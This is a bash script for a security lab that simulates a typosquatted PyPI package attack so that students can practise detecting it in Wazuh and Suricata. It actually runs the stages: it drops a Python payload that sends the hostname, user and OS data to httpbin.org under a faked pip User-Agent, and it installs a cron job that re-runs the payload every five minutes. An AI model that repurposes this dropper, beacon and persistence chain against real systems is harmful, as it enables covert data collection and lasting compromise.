#!/usr/bin/env bash
# Lab 5 — Supply Chain Attack Simulation
# Simulates a malicious PyPI package that installs a payload via post-install hook.
# Safe: operates in /tmp/lab5-supply-chain, real crontab entry removed by --cleanup.

set -euo pipefail

PAYLOAD_DIR="/tmp/lab5-supply-chain"
PAYLOAD_FILE="$PAYLOAD_DIR/update_checker.py"
CRON_MARKER="# LAB5-SIM"
CALLBACK_URL="https://httpbin.org/post"
TAG="lab5-supply-chain"

GRN='\033[0;32m'
YLW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

cleanup() {
  logger -t "$TAG" "CLEANUP: removing payload and cron entry"
  rm -rf "$PAYLOAD_DIR"
  (crontab -l 2>/dev/null | grep -v "$CRON_MARKER" | crontab -) 2>/dev/null || true
  echo -e "${GRN}[cleanup] Payload directory and cron entry removed.${NC}"
}

if [[ "${1:-}" == "--cleanup" ]]; then
  cleanup
  exit 0
fi

# ── Stage 1: Simulated package install ───────────────────────────────────────
echo ""
echo -e "${YLW}[Stage 1] Package install — simulating: pip install fortark-utils==2.1.4${NC}"
logger -t "$TAG" "STAGE:INSTALL pip installing fortark-utils==2.1.4 (typosquatted package)"
sleep 1
logger -t "$TAG" "INSTALL:HOOK post_install hook executing in package setup.py"
echo -e "  Collecting fortark-utils"
echo -e "  Downloading fortark_utils-2.1.4-py3-none-any.whl (12 kB)"
echo -e "  Installing collected packages: fortark-utils"
echo -e "    Running setup.py install for fortark-utils ... done"
echo -e "  Successfully installed fortark-utils-2.1.4"
sleep 1

# ── Stage 2: Payload drop ─────────────────────────────────────────────────────
echo ""
echo -e "${RED}[Stage 2] Payload drop — writing to ${PAYLOAD_DIR}${NC}"
logger -t "$TAG" "STAGE:DROPPER writing payload to $PAYLOAD_FILE"
mkdir -p "$PAYLOAD_DIR"

cat > "$PAYLOAD_FILE" <<'PYEOF'
#!/usr/bin/env python3
# update_checker.py — dropped by fortark-utils post-install hook
import urllib.request, platform, os, json

data = json.dumps({
    "host":    platform.node(),
    "user":    os.environ.get("USER", "unknown"),
    "os":      platform.platform(),
    "payload": "lab5-sim",
    "version": "2.1.4"
}).encode()

try:
    req = urllib.request.Request(
        "https://httpbin.org/post",
        data=data,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "pip/23.0 {python3} CPython/3.10 Linux/x86_64"
        }
    )
    urllib.request.urlopen(req, timeout=8)
except Exception:
    pass
PYEOF

chmod +x "$PAYLOAD_FILE"
logger -t "$TAG" "DROPPER:WRITTEN $PAYLOAD_FILE (disguised as package utility)"
echo -e "  Payload written: $PAYLOAD_FILE"
sleep 1

# ── Stage 3: C2 callback ──────────────────────────────────────────────────────
echo ""
echo -e "${RED}[Stage 3] C2 callback — executing payload, phoning home to ${CALLBACK_URL}${NC}"
logger -t "$TAG" "STAGE:CALLBACK executing $PAYLOAD_FILE — outbound POST to $CALLBACK_URL"
python3 "$PAYLOAD_FILE" || true
logger -t "$TAG" "CALLBACK:BEACON_SENT host=$(hostname) user=${USER:-unknown} destination=httpbin.org"
echo -e "  Beacon sent"
sleep 1

# ── Stage 4: Persistence via cron ─────────────────────────────────────────────
echo ""
echo -e "${RED}[Stage 4] Persistence — installing cron entry${NC}"
logger -t "$TAG" "STAGE:PERSIST modifying crontab to run payload every 5 minutes"
(crontab -l 2>/dev/null || true; echo "*/5 * * * * python3 $PAYLOAD_FILE $CRON_MARKER") | crontab - 2>/dev/null || true
logger -t "$TAG" "PERSIST:CRON_INSTALLED */5 * * * * python3 $PAYLOAD_FILE"
echo -e "  Cron entry installed: */5 * * * * python3 $PAYLOAD_FILE"

echo ""
echo -e "${RED}══════════════════════════════════════════════════════${NC}"
echo -e "${RED}  Supply chain simulation complete${NC}"
echo -e "${RED}  Stage 1: Package install simulated${NC}"
echo -e "${RED}  Stage 2: Payload at $PAYLOAD_FILE${NC}"
echo -e "${RED}  Stage 3: Beacon sent to httpbin.org${NC}"
echo -e "${RED}  Stage 4: Cron persistence installed${NC}"
echo -e "${RED}══════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${YLW}Now find all 4 stages in Wazuh + Suricata.${NC}"
echo -e "${YLW}Run with --cleanup when done.${NC}"
